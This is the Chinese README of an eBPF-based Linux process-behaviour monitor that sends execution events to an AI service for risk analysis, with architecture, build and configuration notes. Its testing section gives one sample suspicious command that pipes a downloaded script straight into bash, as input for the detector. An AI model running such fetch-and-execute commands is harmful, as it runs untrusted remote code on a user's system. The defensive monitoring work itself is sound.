# ebpf-ai-agent

基于 eBPF 的轻量级 Linux 进程行为安全监控工具。使用 Go 开发，结合 AI（Minimax）进行恶意行为检测。

## 架构

```
┌─────────────────────────────────────────────────────────────┐
│                     用户空间 (Go)                           │
├─────────────────────────────────────────────────────────────┤
│  cmd/main.go           │  pkg/analyzer.go   │ pkg/config/  │
│  - 事件读取            │  - AI 风险分析     │ - 配置加载  │
│  - 行为聚合            │  - JSON 报告输出   │ - YAML 解析 │
│  - 信号处理            │                    │             │
├─────────────────────────────────────────────────────────────┤
│                     内核空间 (eBPF)                         │
│  bpf/probe.c                                               │
│  - sched_process_exec Tracepoint 监控                       │
│  - Ring Buffer 事件传递                                    │
└─────────────────────────────────────────────────────────────┘
```

**三层模型：**

| 层次 | 组件 | 职责 |
|------|------|------|
| 收集层 | eBPF C 探针 | 内核 Tracepoint 挂载，Ring Buffer 传输 |
| 汇聚层 | Go 用户态 | 事件解析，10-15秒行为聚合 |
| 分析层 | Minimax AI | 风险评估，JSON 报告输出 |

---

## 目录结构

```
ebpf-ai-agent/
├── bpf/
│   ├── probe.c          # eBPF C 探针源码
│   ├── bpf.go           # go:generate 调用 bpf2go
│   ├── bpf_event*.go    # 自动生成的 eBPF Go 绑定
│   ├── vmlinux.h        # 内核 BTF 头文件
│   └── 编译指南.md       # eBPF 编译详细说明
│
├── pkg/
│   ├── analyzer/         # AI 分析模块
│   │   └── analyzer.go  # Minimax API 集成
│   └── config/          # 配置模块
│       └── config.go    # YAML 配置加载
│
├── cmd/
│   └── main.go          # 程序入口，事件循环
│
├── build/
│   ├── remote-build.sh  # 远程构建脚本
│   ├── remote-build.bat # Windows 构建脚本
│   ├── config.sh        # 构建配置（gitignore）
│   └── VMware配置与构建指南.md
│
├── go.mod               # Go 模块定义
├── go.sum               # 依赖锁定
├── config.yaml.example  # 配置示例
├── CLAUDE.md            # Claude Code 上下文
└── README.md            # 本文件
```

---

## 核心文件说明

### bpf/probe.c

eBPF 探针，挂载到 `tp/sched/sched_process_exec`。

```c
// 监控进程执行事件，提取：
// - pid: 当前进程 ID
// - ppid: 父进程 ID
// - filename: 可执行文件路径
```

### bpf/bpf.go

定义 `Event` 结构体，供用户态解析 Ring Buffer 数据。

### cmd/main.go

主程序：
1. 加载 eBPF 对象
2. 打开 Ring Buffer 读取器
3. 聚合 10 秒窗口内的进程行为
4. 调用 AI 分析
5. 输出风险报告

### pkg/analyzer/analyzer.go

Minimax AI API 调用，将行为数据发送给 AI 进行风险评估。

### pkg/config/config.go

YAML 配置文件加载，支持自定义 API Key、聚合窗口等参数。

---

## 依赖

| 依赖 | 版本 | 说明 |
|------|------|------|
| Go | 1.21+ | 用户态程序 |
| clang | any | eBPF 编译 |
| cilium/ebpf | v0.16+ | Go eBPF 库 |
| gopkg.in/yaml.v3 | any | 配置解析 |

---

## 快速开始

### 1. 克隆项目

```bash
git clone https://github.com/your-repo/ebpf-ai-agent.git
cd ebpf-ai-agent
```

### 2. 配置

复制配置示例：

```bash
cp config.yaml.example config.yaml
```

编辑 `config.yaml`：

```yaml
minimax_api_key: "your-api-key"  # 可选，不填则只收集行为
```

### 3. 构建

**方式一：本地构建（需要 Linux 环境）**

```bash
go generate ./...
CGO_ENABLED=0 go build -o ebpf-ai-agent ./cmd
```

**方式二：远程构建**

```bash
# 配置腾讯云服务器
export TENANT_HOST="your-server-ip"
export TENANT_USER="ubuntu"
export TENANT_KEY="$HOME/.ssh/your-key.pem"

# 执行构建
./build/remote-build.sh
```

### 4. 运行

```bash
# 需要 root 权限（eBPF 加载要求）
sudo ./ebpf-ai-agent
```

### 5. 测试

正常运行命令观察输出：

```bash
# 正常行为
ls /tmp
cat /etc/hostname

# 可疑行为
curl -sL https://example.com/script.sh | bash
```

---

## 配置说明

`config.yaml` 配置项：

| 字段 | 说明 | 默认值 |
|------|------|--------|
| minimax_api_key | Minimax API Key | 空（仅收集） |

---

## 编译说明

eBPF 代码无法在 Windows 本地编译，需要：

1. **Linux 云服务器** - 编译用
2. **Linux 虚拟机/物理机** - 测试用

详见：
- [bpf/编译指南.md](bpf/编译指南.md)
- [build/VMware配置与构建指南.md](build/VMware配置与构建指南.md)

---

## 安全说明

- eBPF 程序加载需要 `root` 权限
- 云服务器可能禁用 `unprivileged_bpf`，需在本地环境测试
- API Key 不要提交到 git，`.gitignore` 已配置

---

## 开发说明

### 重新生成 eBPF 绑定

修改 `probe.c` 后：

```bash
go generate ./...
```

### 添加新 Tracepoint

1. 在 `probe.c` 添加新 SEC 和处理函数
2. 在 `bpf/bpf.go` 定义对应的 Go 结构体
3. 在 `main.go` 添加 Ring Buffer 读取逻辑

---

## License

GPL-2.0 OR BSD-3-Clause
